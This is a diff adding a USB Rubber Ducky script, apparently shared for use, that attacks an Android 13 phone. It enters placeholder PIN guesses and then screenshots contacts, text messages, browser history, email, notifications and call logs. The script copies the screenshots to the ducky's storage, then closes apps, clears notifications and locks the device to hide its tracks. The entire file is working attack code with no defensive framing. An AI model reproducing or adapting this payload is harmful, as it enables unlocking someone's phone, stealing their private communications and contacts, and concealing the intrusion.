@@ -1,0 +1,457 @@
+REM #TITLE: Android 13 Payload
+REM #AUTHOR: $@LVAT10N!
+REM #DESCRIPTION: Android payload to support android 13. This payload will 
+REM # brute force a 4 digit pin and take 10 screenshots of contacts, 10
+REM # screenshots of text logs, 5 screenshots of the browser history,
+REM # one screenshot of notifications, one screenshot of current email,
+REM # and 1 screenshot of the last number called. Then move all 
+REM # screenshots to the ducky storage. Once the pin is cracked press the
+REM # ducky button once to start stage 2 of the payload ( gathering INTEL) 
+REM # If you would like to add more pin guesses and pin randomization consider 
+REM # replacing the bottom of this script with my "pin-crack" attack. This
+REM # script is intended to give you 5 attempts with pins you have gathered
+REM # from recon.This attack will take all screenshots on the device, not
+REM # just the ones the ducky takes, 50% of screenshots are accidents the other
+REM # 50% are important things that cannot be forgotten. Make sure your ducky
+REM # has enough storage to accomidate this attack.
+BUTTON_DEF
+ATTACKMODE HID STORAGE
+DELAY 2000
+REM # If not at homescreen going home
+GUI ENTER
+DELAY 1000
+REM # Open phone
+GUI f
+DELAY 1000
+STRING phone
+DELAY 1000
+ENTER
+DELAY 200
+ENTER
+DELAY 1500
+REM # Pull up last number dialed
+ENTER
+DELAY 1000
+ALT PRINTSCREEN
+DELAY 1000
+REM # closing out screenshot window
+ESC
+DELAY 500
+REM # Going to homescreen
+GUI ENTER
+DELAY 1000
+REM # open notifications
+GUI n
+DELAY 1000
+REM # Take screenshot
+ALT PRINTSCREEN
+DELAY 1000
+ESC 
+DELAY 500
+REM # Going back to homescreen
+GUI ENTER
+DELAY 1000
+REM # Open email
+GUI e
+DELAY 2000
+REM # Take screenshot of recent inbox
+ALT PRINTSCREEN
+DELAY 1000
+ESC
+DELAY 500
+REM # Going back to homescreen
+GUI ENTER
+DELAY 1000
+REM # Open browser 
+GUI b
+DELAY 3000
+REM # Open browser menu , select history and open
+MENU
+DELAY 200
+DOWNARROW
+DELAY 200
+DOWNARROW
+DELAY 200
+DOWNARROW
+DELAY 200
+DOWNARROW
+DELAY 200
+ENTER
+REM # Start taking screenshots of browser history
+DELAY 1000
+ALT PRINTSCREEN
+REM # Clearing screenshot window so scrolling can continue
+DELAY 500
+ESC
+DELAY 200
+PAGEDOWN
+DELAY 200
+VAR $FALL = 10
+WHILE ( $FALL > 0 )
+    DOWNARROW
+    DELAY 200
+    $FALL = ( $FALL - 1 )
+END_WHILE
+
+DELAY 1000
+ALT PRINTSCREEN
+REM # Clearing screenshot window so scrolling can continue
+DELAY 500
+ESC
+
+VAR $FALL = 10
+WHILE ( $FALL > 0 )
+    DOWNARROW
+    DELAY 200
+    $FALL = ( $FALL - 1 )
+END_WHILE
+
+DELAY 1000
+ALT PRINTSCREEN
+REM # Clearing screenshot window so scrolling can continue
+DELAY 500
+ESC
+
+VAR $FALL = 10
+WHILE ( $FALL > 0 )
+    DOWNARROW
+    DELAY 200
+    $FALL = ( $FALL - 1 )
+END_WHILE
+
+DELAY 1000
+ALT PRINTSCREEN
+REM # Clearing screenshot window so scrolling can continue
+DELAY 500
+ESC
+
+VAR $FALL = 10
+WHILE ( $FALL > 0 )
+    DOWNARROW
+    DELAY 200
+    $FALL = ( $FALL - 1 )
+END_WHILE
+
+DELAY 1000
+ALT PRINTSCREEN
+REM # Clearing screenshot window so scrolling can continue
+DELAY 500
+ESC
+
+VAR $FALL = 10
+WHILE ( $FALL > 0 )
+    DOWNARROW
+    DELAY 200
+    $FALL = ( $FALL - 1 )
+END_WHILE
+
+DELAY 1000
+ALT PRINTSCREEN
+REM # Clearing screenshot window so scrolling can continue
+DELAY 500
+ESC
+DELAY 1000
+REM # Returning to Homescreen
+GUI ENTER
+DELAY 1000
+REM # Jump to messages, take screenshot - scroll, rinse and repeat
+GUI s
+DELAY 1000
+DOWNARROW
+DELAY 200
+DOWNARROW
+DELAY 200
+ALT PRINTSCREEN
+DELAY 1000
+REM # Closing out screenshot share window
+ESC
+DELAY 500
+
+VAR $DIP = 15
+WHILE ( $DIP > 0 )
+    DOWNARROW
+    DELAY 200
+    $DIP = ( $DIP - 1 )
+END_WHILE
+
+ALT PRINTSCREEN
+DELAY 1000
+REM # Closing out screenshot share window
+ESC
+DELAY 500
+
+VAR $TRIP = 8
+WHILE ( $TRIP > 0 )
+    DOWNARROW
+    DELAY 200
+    $TRIP = ( $TRIP - 1 )
+END_WHILE
+
+ALT PRINTSCREEN
+DELAY 1000
+REM # Closing out screenshot share window
+ESC
+DELAY 500
+
+VAR $TRIP = 8
+WHILE ( $TRIP > 0 )
+    DOWNARROW
+    DELAY 200
+    $TRIP = ( $TRIP - 1 )
+END_WHILE
+
+ALT PRINTSCREEN
+DELAY 1000
+REM # Closing out screenshot share window
+ESC
+DELAY 500
+
+VAR $TRIP = 8
+WHILE ( $TRIP > 0 )
+    DOWNARROW
+    DELAY 200
+    $TRIP = ( $TRIP - 1 )
+END_WHILE
+
+ALT PRINTSCREEN
+DELAY 1000
+REM # Closing out screenshot share window
+ESC
+DELAY 500
+
+VAR $TRIP = 8
+WHILE ( $TRIP > 0 )
+    DOWNARROW
+    DELAY 200
+    $TRIP = ( $TRIP - 1 )
+END_WHILE
+
+ALT PRINTSCREEN
+DELAY 1000
+REM # Closing out screenshot share window
+ESC
+DELAY 500
+
+VAR $TRIP = 8
+WHILE ( $TRIP > 0 )
+    DOWNARROW
+    DELAY 200
+    $TRIP = ( $TRIP - 1 )
+END_WHILE
+
+ALT PRINTSCREEN
+DELAY 1000
+REM # Closing out screenshot share window
+ESC
+DELAY 500
+
+VAR $TRIP = 8
+WHILE ( $TRIP > 0 )
+    DOWNARROW
+    DELAY 200
+    $TRIP = ( $TRIP - 1 )
+END_WHILE
+
+ALT PRINTSCREEN
+DELAY 1000
+REM # Closing out screenshot share window
+ESC
+DELAY 500
+
+VAR $TRIP = 8
+WHILE ( $TRIP > 0 )
+    DOWNARROW
+    DELAY 200
+    $TRIP = ( $TRIP - 1 )
+END_WHILE
+
+ALT PRINTSCREEN
+DELAY 1000
+REM # Closing out screenshot share window
+ESC
+DELAY 500
+
+VAR $TRIP = 8
+WHILE ( $TRIP > 0 )
+    DOWNARROW
+    DELAY 200
+    $TRIP = ( $TRIP - 1 )
+END_WHILE
+
+ALT PRINTSCREEN
+DELAY 2000
+REM # Closing out screenshot share window
+ESC
+DELAY 1000
+REM # Going home
+GUI ENTER
+DELAY 1000
+REM # Jump to contacts, take screenshot - scroll, rinse and repeat
+GUI c
+DELAY 1000
+DOWNARROW
+DELAY 1000
+ALT PRINTSCREEN
+DELAY 1000
+REM # Escape is used to close out the window opened after a screenshot is taken
+ESC
+
+VAR $CONTACTS = 9
+WHILE ( $CONTACTS > 0 )
+    DELAY 200
+    PAGEDOWN
+    DELAY 1000
+    ALT PRINTSCREEN
+    DELAY 1000
+    ESC
+    $CONTACTS = ( $CONTACTS - 1 )
+END_WHILE
+
+DELAY 1000
+REM # Jump to file manager, find screenshots folder and move there
+GUI r
+DELAY 200
+REM # Search for recent screenshots
+DELAY 200
+ENTER
+DELAY 200
+ENTER
+DELAY 1000
+REM # Reset keyboard for good measure
+RESET
+DELAY 500
+STRING screenshot
+DELAY 1000
+ENTER
+DELAY 200
+REM # Select all screenshots
+CTRL a
+REM # Select the "move" option
+DELAY 1000
+PAGEDOWN
+DELAY 200
+DOWNARROW
+DELAY 200
+DOWNARROW
+DELAY 200
+DOWNARROW
+DELAY 200
+LEFTARROW
+DELAY 200
+LEFTARROW
+DELAY 200
+ENTER
+REM # Select the ducky storage as the move location
+REM # Jump to previous window
+DELAY 1000
+TAB
+DELAY 200
+ENTER
+REM # Jump to previous window
+DELAY 1000
+LEFTARROW
+DELAY 200
+ENTER
+REM # Select ducky storage
+
+VAR $HOP = 5
+WHILE ( $HOP > 0 )
+    DELAY 200
+    DOWNARROW
+    $HOP = ( $HOP - 1 )
+END_WHILE
+
+ENTER
+REM # In ducky storage, select "move here"
+DELAY 200
+PAGEDOWN
+DELAY 200
+DOWNARROW
+DELAY 200
+DOWNARROW
+DELAY 200
+DOWNARROW
+DELAY 200
+RIGHTARROW
+DELAY 200
+RIGHTARROW
+DELAY 200
+ENTER
+REM # Returning to home
+DELAY 1000
+GUI ENTER
+DELAY 200
+REM # Start cleaning up and reduce footprint 
+REM # Open and close out most recent tabs on the device
+
+VAR $WIPE = 8
+WHILE ( $WIPE > 0 )
+    ALT TAB
+    DELAY 200
+    ALT F4
+    DELAY 200
+    $WIPE = ( $WIPE - 1 )
+END_WHILE
+
+DELAY 200
+GUI ENTER
+DELAY 1000
+REM # Clear device notifications
+GUI n
+DELAY 500
+UPARROW
+DELAY 100
+RIGHTARROW
+DELAY 100
+ENTER
+DELAY 1000
+REM # Return home
+GUI ENTER
+DELAY 1000
+REM # Lock device and turn attackmode off
+GUI l
+DELAY 300
+ATTACKMODE OFF
+END_BUTTON
+
+DELAY 3000
+REM # Scroll up, wake screen and start cracking
+REM # The first five strings you can add possible pins gathered from recon 
+REM # data by replacing the x's with pins. This payload is for a 4 digit pin. 
+REM # The pin length can be modified by increasing X string length 
+ATTACKMODE HID
+DELAY 100
+SPACE
+DELAY 100
+SPACE
+DELAY 1000
+STRING X
+STRING X
+STRING X
+STRING X
+ENTER
+DELAY 2000
+STRING X
+STRING X
+STRING X
+STRING X
+ENTER
+DELAY 2000
+STRING X
+STRING X
+STRING X
+STRING X
+ENTER
+DELAY 2000
+STRING X
+STRING X
+STRING X
+STRING X
+ENTER
+DELAY 2000
+STRING X
+STRING X
+STRING X
+STRING X
+ENTER
+DELAY 32000
